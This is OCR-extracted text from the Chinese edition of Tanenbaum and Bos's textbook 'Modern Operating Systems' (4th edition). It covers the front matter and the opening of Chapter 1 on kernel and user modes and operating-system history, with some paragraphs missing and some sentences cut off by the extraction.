计 算 机 科 学
华章教育
Pearson 原书第4版
4
现代操作系统
安德鲁S. 塔嫩鲍姆(Andrew S.Tanenbaum)
赫伯特 · 博斯(Herbert Bos)
陈向群 马洪兵
等译
北京大学 清华大学
Modern Operating Systems
Fourth Edition
ANDREWs.
TANENBAUM HERBERT
BOS
MODERN OPERATING SYSTEMS
机 械 工业出版社
China Machine Press
(计算机科学丛书)
书 名 原 文 ：Modern Operating Systems,Fourth Edition
I. 现… II.① 安 … ② 赫 … ③陈 … I. 操作系统-高等学校-教材 IV.TP316
Authorized translation from the English language edition,entitled Modern Operating Systems,4E,978-0-13-359162-0 by Andrew S.Tanenbaum,Herbert Bos,published by Pearson Education,Inc.,Copyright O 2015,2008.
All rights reserved.No part of this book may be reproduced or transmitted in any form or by any means,electronic or mechanical,including photocopying,recording or by any information storage retrieval system,without permission from Pearson Education,Inc.
Chinese simplified language edition published by Pearson Education Asia Ltd.,and China Machine Press Copyright C 2017.
本书封底贴有Pearson Education(培生教育出版集团)激光防伪标签，无标签者不得销售。
责任编辑：曲熠
印 刷：北京瑞德印刷有限公司
开 本：185mm×260mm 1/16
责任校对：殷虹
版 次：2017年7月第1版第1次印刷
印 张：39
读者信箱：hzjsj@hzbook.com
版权所有 ·侵权必究
封底无防伪标均为盗版
本书法律顾问：北京大成律师事务所 韩光/邹晓东
出版者的话
Modern Operating Systems,Fourth Editionl
近年，在全球信息化大潮的推动下，我国的计算机产业发展迅猛，对专业人才的需求日益迫切。
这对 计算机教育界和出版界都既是机遇，也是挑战；而专业教材的建设在教育战略上显得举足轻重。
在我国信 息技术发展时间较短的现状下，美国等发达国家在其计算机科学发展的几十年间积淀和发展的经典教材仍 有许多值得借鉴之处。
因此，引进一批国外优秀计算机教材将对我国计算机教育事业的发展起到积极的推 动作用，也是与世界接轨、建设真正的世界一流大学的必由之路。
“计算机科学丛书”的出版工作得到了国内外学者的鼎力相助，国内的专家不仅提供了中肯的选题指 导，还不辞劳苦地担任了翻译和审校的工作；而原书的作者也相当关注其作品在中国的传播，有的还专门 为其书的中译本作序。
迄今，“计算机科学丛书”已经出版了近两百个品种，这些书籍在读者中树立了良好 的口碑，并被许多高校采用为正式教材和参考书籍。
其影印版“经典原版书库”作为姊妹篇也被越来越多 实施双语教学的学校所采用。
权威的作者、经典的教材、一流的译者、严格的审校、精细的编辑，这些因素使我们的图书有了质量 的保证。
随着计算机科学与技术专业学科建设的不断完善和教材改革的逐渐深化，教育界对国外计算机教 材的需求和应用都将步入一个新的阶段，我们的目标是尽善尽美，而反馈的意见正是我们达到这一终极目 标的重要帮助。
华章公司欢迎老师和读者对我们的工作提出建议或给予指正，我们的联系方法如下：
电子邮件：hzjsj@hzbook.com
联系电话：(010)88379604
联系地址：北京市西城区百万庄南街1号
邮政编码：100037
华章教育
华章科技图书出版中心
译 者 序
Modern Operating Systems,Fourth Edition
Andrew S.Tanenbaum教授编写的教材《现代操作系统》现在已经是第4版了。
第4版在保持原有特 色的基础上，又增添了许多新的内容，反映了当代操作系统的发展与动向，并不断地与时俱进。
本教材还增添了一名合著者——来自阿姆斯特丹自由大学的Herbert Bos教授，他是一名全方位的系 统专家，尤其擅长安全和UNIX 方面。
Tanenbaum教授的教材还有一个特点，就是丰富的、引发思考的习题。
所有章节后面都附有大量的习题， 完成这些习题很不容易，需要花费很长时间，在深入理解操作系统精髓的基础上才能作答。
这些习题很灵 活，并且与实际系统相结合，既考核对基本概念、工作原理的理解，又考核实际动手能力。
Tanenbaum 教授的教材是需要细细阅读的，字里行间体现了他对设计与实现操作系统的各种技术的 深人思考。
正因为Tanenbaum 教授自己设计开发了一个小型、真实的操作系统MINIX, 所以通过他在教 材中的讲述，读者可以了解实现操作系统时应该考虑哪些问题、注重哪些细节。
由于译者水平有限，因此译文中难免会存在一些不足或错误之处，欢迎各位专家和广大读者批评指正。
译 者
2017年5月
前 言
Modern Operating Systems,Fourth Edition l
第3章更关注现代的硬件部件，而减少了对段和MULTICS的介绍。
第6章的内容基本没有改变，有关死锁的主题基本上是稳定的，并没有新的成果。
第10章有很大改变，除了对UNIX 和 Linux 的内容进行更新外，还新增了有关Android 操作系统的详 细章节，该系统如今已广泛用于智能手机与平板电脑。
第11章在本书第3版中主要针对Windows Vista,然而这些内容已经被Windows 8尤其是Windows 8.1 取代，本章介绍了有关Windows 的最新内容。
第12章是对本书前一版本的第13章的修订。
第13章是一份全新的推荐阅读目录。
此外，我们也对参考文献进行了更新，收录了本书第3版推出 后发表的233篇新论文。
有很多人参与了本书第4版的编写工作。
我要介绍的第一位同时也是最重要的一位，是来自阿姆斯特 丹自由大学的Herbert Bos教授，他是本书的合著者。
他是一名全方位的系统专家，尤其是在安全和UNIX 方面，有他的帮助真是太好了。
他编写了除以下所述内容之外的绝大部分新内容。
VI
第7章中有关VMware 的内容(7. 12节)是由Edouard Bugnion完成的，他来自洛桑联邦理工学院 (EPFL) 。
Edouard 是 VMware 公司的创始人之一，他比其他人更了解VMware, 我们感谢他所提供的 巨大支持。
佐治亚理工学院的Ada Gavrilovska是 Linux 内核专家，她帮忙更新了第10章的内容。
第10章中有 关Android 的内容是由来自Google 的 Android 系统核心工程师 Dianne Hackborn 编写的。
Android 现在是智 能手机的主要操作系统，所以我们非常感谢Dianne所提供的帮助。
如今第10章篇幅较长并且十分详细， UNIX 、Linux和 Android 的粉丝们都能从中学到很多。
值得一提的是，本书中最长并且最有技术含量的章 节是由两位女士所写的，而我们只是完成了其余容易的工作。
然而，我们并没有忽略Windows 。
Microsoft的 Dave Probert 更新了上版中第11章的内容，这一版将 详细讲解Windows 8.1 。
Dave拥有完备的Windows 知识及足够的远见，可以辨别出微软正确的地方和错误 的地方。
Windows的粉丝们肯定会喜欢这一章。
这本书由于所有这些专家所做出的贡献而变得更好，所以再一次感谢他们的宝贵帮助。
同样令我们感到幸运的是，我们拥有那么多阅读过原稿并提出建议的评论者，他们是Trudy Levine 、Shivakant Mishra 、Krishna Sivalingam 以及Ken Wong 。
Steve Armstrong为将本书作为教材的教 师 制 作 了 P P T 。
通常来说，文字编辑和校对员并不具备充足的操作系统专业知识，但是Bob Lentz(文字编辑)和Joe Ruddick(校对员)却非常专业。
Joe 有一个很特别的本事，他能从20米之外看出罗马字体与斜体的差别。
尽管如此，我们这些作者将对书中所有残留的错误负责，读者若看到任何错误都可以联系作者中的任何一位。
放在最后但并非是最不重要的，Barbara 和Marvin 还是那么出众， 一如既往地独一无二。
Daniel 和 Matilde是我们家庭中伟大的新成员。
Aron和Nathan是很有意思的小家伙，Olivia 对我们来说是珍宝。
当然了， 我要感谢Suzanne 一直以来的爱和耐心，感谢你带来的那些sinaasappelsap(荷兰语，橙汁)、druiven(荷兰语， 葡萄)和kersen(荷兰语，樱桃),以及所有的新鲜果蔬。
(AST)
最重要的一点，我要感谢Marieke 、Duko 和Jip 。
感谢Marieke 一直以来的关爱，还有忍受我为了此 书而没日没夜地工作。
感谢Duko 和Jip 将我从工作中拽出来，并让我知道生活中还有更重要的事情，比如 《Minecraft》。
(HB)
Andrew S.Tanenbaum Herbert Bos
作者简介
Modern Operating Systems,Fourth Editionl
Tanenbaum 教授的博士生在毕业后都有很好的前途，对于这一点教授本人非常自豪。
在这方面，他如 同一只爱孩子的母鸡。
Tanenbaum 教 授 是ACM 会士、IEEE 会士，也是荷兰皇家艺术与科学院院士。
他荣获了相当多的 ACM 、IEEE 和USENIX 奖项。
如果你对此感到好奇，可以去他的Wikipedia 主页查看。
他还有两个荣誉博 士学位。
目 录 |
Modern OperatingSystems,FourthEdition
出版者的话 译者序
前 言
作者简介
IX
X
XI
XII
XIII
XIV
第1章
Modern Operating Systems,Fourth Edition
引 论
多数读者都会对诸如Windows 、Linux 、FreeBSD 或OS X等某个操作系统有些体验，但表面现象是 会骗人的。
用户与之交互的程序，基于文本的通常称为shell, 而基于图标的则称为图形用户界面 (Graphical User Interface,GUI),它们实际上并不是操作系统的一部分，尽管这些程序使用操作系统来 完成工作。
图1-1给出了这里所讨论的主要部件的一个简化视图。
图的底部是硬件。
硬件包括芯片、电路板、 磁盘、键盘、显示器以及类似的设备。
在硬件的顶部是软件。
多数计算机有两种运行模式：内核态和用 户态。
软件中最基础的部分是操作系统，它运行在内核态 (也称为管态、核心态)。
在这个模式中，操 作系统具有对所有硬件的完全访问权，可以执行机器能够运行的任何指令。
软件的其余部分运行在用户 态下。
在用户态下，只使用了机器指令中的一个子集。
特别地，那些会影响机器的控制或可进行I/O (输入/输出)操作的指令，在用户态中的程序里是禁止的。
在本书中，我们会不断地讨论内核态和用户
态之间的差别，这些差别在操作系统的运作中扮 演着极其重要的角色。
用户接口程序 (shell 或者GUI) 处于用户态 程序中的最低层次，允许用户运行其他程序，诸 如Web浏览器、电子邮件阅读器或音乐播放器等。
这些程序也大量使用操作系统。
操作系统所在的位置如图1-1所示。
它运行在 裸机之上，为所有其他软件提供基础的运行环境。
操作系统和普通软件(用户态)之间的主要 区别是，如果用户不喜欢某个特定的电子邮件阅 读器，他可以自由选择另一个，或者自己写一个， 但是不能自行写一个属于操作系统一部分的时钟 中断处理程序。
这个程序由硬件保护，防止用户 试图对其进行修改。
图1-1 操作系统所处的位置
然而，有时在嵌入式系统(该系统没有内核态)或解释系统(如基于Java的操作系统，它采用解释 方式而非硬件方式区分组件)中，上述区别是模糊的。
另外，在许多系统中， 一些在用户态下运行的程序协助操作系统完成特权功能。
例如，经常有一个 程序供用户修改其口令之用。
但是这个程序不是操作系统的一部分，也不在内核态下运行，不过它明显 地带有敏感的功能，并且必须以某种方式给予保护。
在某些系统中，这种想法被推向了极致， 一些传统 上被认为是操作系统的部分(诸如文件系统)在用户空间中运行。
在这类系统中，很难划分出一条明显 的界限。
在内核态中运行的当然是操作系统的一部分，但是一些在内核外运行的程序也有争议地被认为 是操作系统的一部分，或者至少与操作系统密切相关。
请考虑具有500万行的一套书，每页50行，每卷1000页(比本书厚)。
为了以书的大小列出一个操作系统， 需要有100卷书——基本上需要一整个书架来摆放。
请设想一下有个维护操作系统的工作，第一天老板 带你到装有代码的书架旁，说：“去读吧。
”而这仅仅是运行在内核中的部分代码。
当包括重要的共享库 时 ，Windows 将有超过7000万行代码，或者说要用10~20个书架，而且这还不包括一些基础的应用(如 Windows Explorer 、Windows Media Player等)。
至于为什么操作系统的寿命较长，读者现在应该清楚了——操作系统是很难编写的。
一旦编写完成， 操作系统的所有者当然不愿意把它扔掉，再写一个。
相反，操作系统会在长时间内进行演化。
基本上可 以 把Windows 95/98/Me看成是一个操作系统，而Windows NT/2000/XP/Vista/Windows 7则是另外一个操 作系统。
对于用户而言，它们看上去很像，因为微软公司努力使Windows 2000/XP/Vista/Windows 7与被 替代系统(如Windows 98) 的用户界面看起来十分相似。
无论如何，微软公司要舍弃Windows 98是有 非常正当的原因的，我们将在第11章涉及Windows 细节时具体讨论这一内容。
除 了Windows 以外，贯穿本书的其他主要例子还有UNIX, 以及它的变体和克隆版。
UNIX 当然也演 化了多年，如System V版 、Solaris以及FreeBSD 等都是来源于UNIX 的原始版；不过尽管Linux非常像依 照UNIX 模式仿制而成，并且与UNIX 高度兼容，但是Linux 具有全新的代码基础。
本书将采用来自UNIX 中的示例，并在第10章中具体讨论Linux。
本章将简要叙述操作系统的若干重要部分，内容包括其含义、历史、分类、 一些基本概念及其结构。
在后面的章节中，我们将具体讨论这些重要内容。
1.1 什么是操作系统
很难给出操作系统的准确定义。
操作系统是一种运行在内核态的软件——尽管这个说法并不总是符 合事实。
部分原因是操作系统有两个基本上独立的任务，即为应用程序员(实际上是应用程序)提供一 个资源集的清晰抽象，并管理这些硬件资源，而不仅仅是一堆硬件。
另外，还取决于从什么角度看待操 作系统。
读者多半听说过其中一个或另一个的功能。
下面我们逐项进行讨论。
1.1.1 作为扩展机器的操作系统
但就算是在这个层面，对于大多数应用来说还是太底层了。
因此，所有的操作系统都提供使用硬 盘的又一层抽象：文件。
使用该抽象，程序能创建、读写文件，而不用处理硬件实际工作中那些恼人 的细节。
抽象是管理复杂性的一个关键。
好的抽象可以把一个几乎不可能管理的任务划分为两个可管理的部 分。
其第一部分是有关抽象的定义和实现，第二部分是随时用这些抽象解决问题。
几乎每个计算机用户 都理解的一个抽象是文件，正如上文所提到的。
文件是一种有效的信息片段，诸如数码照片、保存的电 子邮件、歌曲或Web页面等。
处理数码照片、电子邮件、歌曲以及Web页面等，要比处理SATA (或者其 他)硬盘的细节容易，这些磁盘的具体细节与前面叙述过的软盘一样。
操作系统的任务是创建好的抽象， 并实现和管理它所创建的抽象对象。
本书中，我们将研究许多关于抽象的内容，因为这是理解操作系统 的关键。
上述观点是非常重要的，所以值得用不同的表达方式来再次叙述。
即使怀着如此小心翼翼对设计 Macintosh 机器的工业设计师的尊重，还是不得不说，硬件是丑陋的。
真实的处理器、内存条、磁盘和其 他装置都是非常复杂的，对于那些为使用某个硬件而不得不编写软件的人们而言，他们使用的是困难、 可怕、特殊和不一致的接口。
有时这是由于需要兼容旧的硬件，有时是为了节省成本，但是，有时硬件
设计师们并没有意识到(或在意)他们给软件设计带来了多大的麻烦。
操作系统的一个主要任务是隐藏 硬件，呈现给程序(以及程序员)良好、清晰、优雅、 一致的抽象。
如图1-2所示，操作系统将丑陋转变
为美丽。
图1-2 操作系统将丑陋的硬件转变为美丽的抽象
的界面，但是在这两种情形中，操作系统下面的抽象是相同的。
1.1.2 作为资源管理者的操作系统
把操作系统看作向应用程序提供基本抽象的概念，是一种自顶向下的观点。
按照另一种自底向上的 观点，操作系统则用来管理一个复杂系统的各个部分。
现代计算机包含处理器、存储器、时钟、磁盘、 鼠标、网络接口、打印机以及许多其他设备。
从这个角度看，操作系统的任务是在相互竞争的程序之间 有序地控制对处理器、存储器以及其他I/O接口设备的分配。
现代操作系统允许同时在内存中运行多道程序。
假设在一台计算机上运行的三个程序试图同时在同 一台打印机上输出计算结果，那么开始的几行可能是程序1的输出，接着几行是程序2的输出，然后又是 程序3的输出等，最终结果将是一团糟。
采用将打印结果送到磁盘上缓冲区的方法，操作系统可以把潜 在的混乱有序化。
在一个程序结束后，操作系统可以将暂存在磁盘上的文件送到打印机输出，同时其他 程序可以继续产生更多的输出结果，很明显，这些程序的输出还没有真正送至打印机。
当一个计算机(或网络)有多个用户时，管理和保护存储器、I/O 设备以及其他资源的需求变得强 烈起来，因为用户间可能会互相干扰。
另外，用户通常不仅共享硬件，还要共享信息(文件、数据库等)。
简而言之，操作系统的这种观点认为，操作系统的主要任务是记录哪个程序在使用什么资源，对资源请 求进行分配，评估使用代价，并且为不同的程序和用户调解互相冲突的资源请求。
资源管理包括用以下两种不同方式实现多路复用 (共享)资源：在时间上复用和在空间上复用。
当 一种资源在时间上复用时，不同的程序或用户轮流使用它。
先是第一个获得资源的使用，然后下一个， 以此类推。
例如，若在系统中只有一个CPU, 而多个程序需要在该CPU 上运行，操作系统则首先把该 CPU分配给某个程序，在它运行了足够长的时间之后，另一个程序得到CPU, 然后是下一个，如此进行 下去，最终，轮到第一个程序再次运行。
至于资源是如何实现时间复用的——谁应该是下一个以及运行 多长时间等——则是操作系统的任务。
还有一个有关时间复用的例子是打印机的共享。
当多个打印作业 在一台打印机上排队等待打印时，必须决定将轮到打印的是哪个作业。
统的典型任务。
1.2 操作系统的历史
操作系统已经存在许多年了。
在下面的小节中，我们将简要地考察操作系统历史上的一些重要之处。
操作系统与其所运行的计算机体系结构的联系非常密切。
我们将分析连续几代的计算机，看看它们的操 作系统是什么样的。
把操作系统的分代映射到计算机的分代上有些粗糙，但是这样做确实有某些作用， 否则没有其他好办法能够说清楚操作系统的历史。
下面给出的有关操作系统的发展主要是按照时间线索叙述的，且在时间上是有重叠的。
每个发展并 不是等到先前一种发展完成后才开始。
存在着大量的重叠，更不用说还存在有不少虚假的开始和终结时 间。
请读者把这里的文字叙述看成是一种指引，而不是盖棺定论。
第一台真正的数字计算机是英国数学家Charles Babbage(1792—1871) 设计的。
尽管Babbage 花费 了他几乎一生的时间和财产，试图建造他的“分析机”,但是他始终未能让机器正常运转，因为它是一 台纯机械的数字计算机，他所在时代的技术不能生产出他所需要的高精度轮子、齿轮和轮牙。
毫无疑问， 这台分析机没有操作系统。
有 一段有趣的历史花絮，Babbage 认识到他的分析机需要软件，所以他雇佣了一个名为Ada Lovelace 的年轻妇女，这是世界上第一个程序员，而她是著名的英国诗人Lord Byron的女儿。
程序设计 语言Ada是以她命名的。
1.2.1 第一代(1945～1955):真空管和穿孔卡片
从Babbage 失败之后一直到第二次世界大战，数字计算机的建造几乎没有什么进展，第二次世界大 战刺激了有关计算机研究工作的爆炸性开展。
艾奥瓦州立大学的John Atanasoff教授和他的学生Clifford Berry 建造了被认为是第一台可工作的数字计算机。
该机器使用了300个真空管。
大约在同时，Konrad Zuse在柏林用继电器构建了Z3计算机。
1944年， 一群科学家(包括Alan Turing) 在英格兰布莱切利庄园 构建了Colossus 并为其编程，Howard Aiken在哈佛大学建造了Mark I,宾夕法尼亚大学的William Mauchley 和他的学生J.Presper Eckert建造了ENIAC。
这些机器有的是二进制的，有的使用真空管，有的 是可编程的，但是都非常原始，甚至需要花费数秒时间才能完成最简单的运算。
在那个年代里，同一个小组的人(通常是工程师们)设计、建造、编程、操作并维护一台机器。
所 有的程序设计是用纯粹的机器语言编写的，甚至更糟糕，需要通过将上千根电缆接到插件板上连接成电 路，以便控制机器的基本功能。
没有程序设计语言(甚至汇编语言也没有),操作系统则从来没有听说 过。
使用机器的一般方式是，程序员在墙上的机时表上预约一段时间，然后到机房中将他的插件板接到 计算机里，在接下来的几小时里，期盼正在运行中的两万多个真空管不会烧坏。
那时，所有的计算问题 实际上都只是简单的数学运算，如制作正弦、余弦、对数表或者计算炮弹弹道等。
到了20世纪50年代初有了改进，出现了穿孔卡片，这时就可以将程序写在卡片上，然后读入计算机 而不用插件板，但其他过程则依然如旧。
1.2.2 第二代(1955～1965):晶体管和批处理系统
.20世纪50年代晶体管的发明极大地改变了整个状况。
计算机已经很可靠，厂商可以成批地生产并销 售计算机给用户，用户可以指望计算机长时间运行，完成一些有用的工作。
此时，设计人员、生产人员、 操作人员、程序人员和维护人员之间第一次有了明确的分工。
这些机器，现在被称作大型机 (mainframe), 锁在有专用空调的大房间中，由专业操作人员运行。
只有少数大公司、重要的政府部门或大学才接受数百万美元的标价。
要运行一个作业 (job, 即一个或 一组程序),程序员首先将程序写在纸上(用FORTRAN语言或汇编语言),然后穿孔成卡片，再将卡片 盒带到输入室，交给操作员，接着就喝咖啡直到输出完成。
计算机运行完当前的任务后，其计算结果从打印机上输出，操作员到打印机上撕下运算结果并送到 输出室，程序员稍后就可取到结果。
然后，操作员从已送到输入室的卡片盒中读入另一个任务。
如果需 要FORTRAN编译器，操作员还要从文件柜把它取来读入计算机。
当操作员在机房里走来走去时许多机 时被浪费掉了。
由于当时的计算机非常昂贵，人们很自然地要想办法减少机时的浪费。
通常采用的解决方法就是批 处理系统 (batch system)。
其思想是：在输入室收集全部的作业，然后用一台相对便宜的计算机如IBM 1401计算机将它们读到磁带上。
IBM 1401计算机适用于读卡片、复制磁带和输出打印，但不适用于数值 运算。
另外用较昂贵的计算机如IBM 7094来完成真正的计算。
这些情况如图1-3所示。
a) b) c) d) e) f)
图1-3 一种早期的批处理系统：a) 程序员将卡片拿到1401机处；b)1401 机将批处理作业读到磁带上；
c) 操作员将输入带送至7094机；d)7094 机进行计算；e) 操作员将输出磁带送到1401机；f)1401 机打 印输出
在收集了大约一个小时的批量作业之后，这些卡片被读进磁带，然后磁带被送到机房里并装到磁带 机上。
随后，操作员装入一个特殊的程序(现代操作系统的前身),它从磁带上读入第一个作业并运行， 其输出写到第二盘磁带上，而不打印。
每个作业结束后，操作系统自动地从磁带上读入下一个作业并运 行。
当一批作业完全结束后，操作员取下输入和输出磁带，将输入磁带换成下一批作业，并把输出磁带 拿到一台1401机器上进行脱机 (不与主计算机联机)打印。
典型的输入作业结构如图1-4所示。
一开始是$JOB卡片，它标识出所需的最大运行时间(以分钟为 单位)、计费账号以及程序员的名字。
接着是$FORTRAN 卡片，通知操作系统从系统磁带上装入 FORTRAN语言编译器。
之后就是待编译的源程序，然后是$LOAD卡片，通知操作系统装入编译好的目 标程序。
接着是$RUN卡片，告诉操作系统运行该程序并使用随后的数据。
最后，$END卡片标识作业结 束。
这些基本的控制卡片是现代shell和命令解释器的先驱。
图1-4 典型的FMS作业结构
第二代大型计算机主要用于科学与工程计算，例如，解偏微分方程。
这些题目大多用FORTRAN 语 言和汇编语言编写。
典型的操作系统是FMS(FORTRAN Monitor System,FORTRAN监控系统)和 IBSYS(IBM 为7094机配备的操作系统)。
1.2.3 第三代(1965～1980):集成电路和多道程序设计
开发和维护两种完全不同的产品，对厂商来说是昂贵的。
另外，许多新的计算机用户一开始时只需 要一台小计算机，后来可能又需要一台较大的计算机，而且希望能够更快地执行原有的程序。
IBM公司试图通过引入System/360 来一次性地解决这两个问题。
360是一个软件兼容的计算机系列， 其低档机与1401相当，高档机则比7094功能强很多。
这些计算机只在价格和性能(最大存储器容量、处 理器速度、允许的I/O 设备数量等)上有差异。
由于所有的计算机都有相同的体系结构和指令集，因此， 在理论上，为一种型号机器编写的程序可以在其他所有型号的机器上运行。
(但就像传言Yogi Berra曾说 过的那样：“在理论上，理论和实际是一致的；而实际上，它们并不是。
”)既然360被设计成既可用于科 学计算，又可用于商业计算，那么一个系列的计算机便可以满足所有用户的要求。
在随后的几年里， IBM 使用更现代的技术陆续推出了360的后续机型，如著名的370、4300、3080和3090系列。
zSeries 是这 个系列的最新机型，不过它与早期的机型相比变化非常之大。
IBM 无法写出同时满足这些相互冲突需要的软件(其他公司也不行)。
其结果是一个庞大的又极其 复杂的操作系统，它比FMS 大了约2~3个数量级规模。
其中包含数千名程序员写的数百万行汇编语言代 码，也包含成千上万处错误，这就导致IBM 不断地发行新的版本试图更正这些错误。
每个新版本在修正 老错误的同时又引入了新错误，所以随着时间的流逝，错误的数量可能大致保持不变。
OS/360 的设计者之一Fred Brooks 后来写过一本既诙谐又尖锐的书 (Brooks,1995), 描述他在开发 OS/360过程中的经验。
我们不可能在这里复述该书的全部内容，不过其封面已经充分表达了Fred Brooks 的观点—一群史前动物陷入泥潭而不能自拔。
Silberschatz 等人(2012)的封面也表达了操作系统如同 恐龙一般的类似观点。
抛开OS/360 的庞大和存在的问题，OS/360 和其他公司类似的第三代操作系统的确合理地满足了大 多数用户的要求。
同时，它们也使第二代操作系统所缺乏的几项关键技术得到了广泛应用。
其中最重要
的应该是多道程序设计 (multiprogramming) 。
在7094机上，若当前作业 因等待磁带或其他I/O操作而暂停，CPU 就只能简单地踏步直至该I/O完成。
对于CPU操作密集的科学计算问题，I/O 操作较少，因此浪费的时间很少。
然而，对于商业数据处理，I/O 操作等待的时间通常占到80%～90%,所以 必须采取某种措施减少(昂贵的)CPU 空闲时间的浪费。
解决方案是将内存分几个部分，每一部分存放不同的作业，如图1-5 所示。
当一个作业等待I/O操作完成时，另一个作业可以使用CPU。
如果 内存中可以同时存放足够多的作业，则CPU 利用率可以接近100%。
在内 存中同时驻留多个作业需要特殊的硬件来对其进行保护，以避免作业的信 息被窃取或受到攻击。
360及其他第三代计算机都配有此类硬件。
图1-5 一个内存中有三个作 业的多道程序系统
第三代计算机的另一个特性是，卡片被拿到机房后能够很快地将作业从卡片读入磁盘。
于是，任何 时刻当一个作业运行结束时，操作系统就能将一个新作业从磁盘读出，装进空出来的内存区域运行。
这 种技术叫作同时的外部设备联机操作 (Simultaneous Peripheral Operation On Line,SPOOLing),该 技
术同时也用于输出。
当采用了SPOOLing 技术后，就不再需要IBM 1401机，也不必再将磁带搬来搬去了。
第三代操作系统很适用于大型科学计算和繁忙的商务数据处理，但其实质上仍旧是批处理系统。
许 多程序员很怀念第一代计算机的使用方式，那时他们可以几个小时地独占一台机器，可以即时地调试他 们的程序。
而对第三代计算机而言，从一个作业提交到运算结果取回往往长达数小时，更有甚者， 一个 逗号的误用就会导致编译失败，而可能浪费了程序员半天的时间，程序员并不喜欢这样。
MULTICS 是一种混合式的成功。
尽管这台机器具有较强的I/O能力，却要在一台仅仅比Intel 386 PC 性能强一点的机器上支持数百个用户。
可是这个想法并不像表面上那么荒唐，因为那时的人们已经知道 如何编写精练的高效程序，虽然这种技巧随后逐渐丢失了。
有许多原因造成MULTICS 没有能够普及到 全世界，至少它不应该采用PL/1编程语言编写，因为PL/1编译器推迟了好几年才完成，好不容易完成的 编译器又极少能够成功运行。
另外，当时的MULTICS 有太大的野心，犹如19世纪中期Charles Babbage 的分析机。
尽管MULTICS 在商业上失败了，但MULTICS 对随后的操作系统(特别是UNIX 和它的衍生系统， 如FreeBSD 、Linux 、iOS 以 及Android) 却有着巨大的影响，详情请参阅有关文献和书籍 (Corbat6 等人， 1972;Corbató 和Vyssotsky,1965;Daley 和Dennis,1968;Organick,1972;Saltzer,1974) 。
还 有 一
另一个第三代计算机的主要进展是小型机的崛起，以1961年DEC的PDP-1作为起点。
PDP-1 计算机 只有4K个18位的内存，每台售价120000美元(不到IBM 7094的5%),该机型非常热销。
对于某些非数
值的计算，它和7094几乎一样快。
PDP-1 开辟了一个全新的产业。
很快有了一系列PDP 机型(与IBM系 列机不同，它们互不兼容),其顶峰为PDP-11。
曾参与MULTICS研制的贝尔实验室计算机科学家Ken Thompson,后来找到一台无人使用的PDP-7 机器，并开始开发一个简化的单用户版MULTICS 。
他的工作后来导致了UNIX 操作系统的诞生。
接着， UNIX在学术界、政府部门以及许多公司中流行。
对UNIX 版本免费产品(不同于教育目的)的愿望，促使芬兰学生Linus Torvalds编写了Linux。
这 个系统直接受到在MINIX上开发的启示，而且最初支持各种MINIX的功能(例如MINIX文件系统)。
尽 管它已经被很多人通过多种方式扩展，但是该系统仍然保留了某些与MINIX 和UNIX 共同的基本结构。
对Linux 和开放源码运动的具体历史感兴趣的读者可以阅读Glyn Moody(2001)。
本书所叙述的有关 UNIX的多数内容，也适用于System V 、MINIX 、Linux以及UNIX的其他版本和克隆。
1.2.4 第四代(1980年至今):个人计算机
随着LSI (大规模集成)电路的发展，在每平方厘米的硅片芯片上可以集成数千个晶体管，个人计 算机时代到来了。
从体系结构上看，个人计算机(最早称为微型计算机)与PDP-11 并无二致，但就价格 而言却相去甚远。
以往，公司的一个部门或大学里的一个院系才配备一台小型机，而微处理器却使每个 人都能拥有自己的计算机。
1974年，当Intel 8080——第一代通用8位CPU出现时，Intel 希望有一个用于8080的操作系统，部分 是为了测试目的。
Intel 请求其顾问Gary Kildall编 写 。
Kildall 和一位朋友首先为新推出的Shugart Associates 8英寸软盘构造了一个控制器，并把这个软磁盘同8080相连，从而制造了第一个配有磁盘的 微型计算机。
然后Kildall 为它写了一个基于磁盘的操作系统，称为CP/M(Control Program for Microcomputer) 。
由 于Intel 不认为基于磁盘的微型计算机有什么前景，所以当Kildall 要求CP/M的版权时， Intel同意了他的要求。
Kildall于是组建了一家公司Digital Research,进一步开发和销售CP/M。
1977年，Digital Research重写了CP/M, 使其可以在使用8080、Zilog Z80以及其他CPU芯片的多种 微型计算机上运行，从而完全控制了微型计算机世界达5年之久。
在20世纪80年代早期，IBM 设计了IBM PC并寻找可在上面运行的软件。
来自IBM的人员同Bill Gates 联系有关他的BASIC解释器的许可证事宜，他们也询问他是否知道可在PC上运行的操作系统。
Gates 建议 IBM同Digital Research联系，即当时世界上主宰操作系统的公司。
在做出毫无疑问是近代历史上最糟的商 业决策后，Kildall 拒绝与IBM会见，代替他的是一位次要人员。
更糟糕的是，他的律师甚至拒绝签署IBM 的有关尚未公开的PC 的保密协议。
结果，IBM 回头询问Gates可否提供给他们一个操作系统。
Gates 极其聪明的决策——将MS-DOS与计算机公司的硬件捆绑在一起出售。
在所有这一切烟消云散之后， Kildall突然不幸去世，其原因从来没有公布过。
1983年，IBM PC后续机型IBM PC/AT推出，配有Intel 80286 CPU。
此 时 ，MS-DOS 已经确立了地 位，而CP/M只剩下最后的支撑。
MS-DOS 后来在80386和80486中得到广泛的应用。
尽管MS-DOS的早 期版本是相当原始的，但是后期的版本提供了更多的先进功能，包括许多源自UNIX 的功能。
(微软对 UNIX是如此娴熟，甚至在公司的早期销售过一个微型计算机版本，称为XENIX。
)
用于早期微型计算机的CP/M 、MS-DOS 和其他操作系统，都是通过键盘输入命令的。
由于Doug Engelbart 于20世纪60年代在斯坦福研究院 (Stanford Research Institute) 工作，这种情况最终有了改变。
Doug Engelbart发明了图形用户界面，包括窗口、图标、菜单以及鼠标。
这些思想被Xerox PARC的研究 人员采用，并用在了他们所研制的机器中。
一 天 ，Steve Jobs(他和其他人一起在车库里发明了苹果计算机)访问PARC, 一 看到GUI, 立 即 意识到它的潜在价值，而Xerox管理层恰好没有认识到。
这种战略失误的庞大比例，导致名为《摸索未 来》一书的出版 (Smith 和Alexander,1988) 。
Jobs 随后着手设计了带有GUI的苹果计算机。
这个项目 导致了Lisa的推出，但是Lisa 过于昂贵，所以在商业上失败了。
Jobs 的第二次尝试，即苹果Macintosh, 取得了巨大的成功，这不仅是因为它比Lisa便宜得多，而且它还是用户友好的 (user friendly),也 就 是 说，它是为那些不仅没有计算机知识而且根本不打算学习计算机的用户准备的。
在图形设计、专业数 码摄影以及专业数字视频制作的创意世界里，Macintosh 得到广泛的应用，这些用户对苹果公司及 Macintosh 有着极大的热情。
1999年，苹果公司采用了一种内核，它来自本是为替换BSD UNIX内核而 开发的卡内基 ·梅隆大学的Mach 微核。
因此，尽管有着截然不同的界面，但MAC oS X是基于UNIX 的操作系统。
在微软决定构建MS-DOS 的后继产品时，受到了Macintosh 成功的巨大影响。
微软开发了名为 Windows的基于GUI的系统，早期它运行在MS-DOS 上层(它更像 shell 而不像真正的操作系统)。
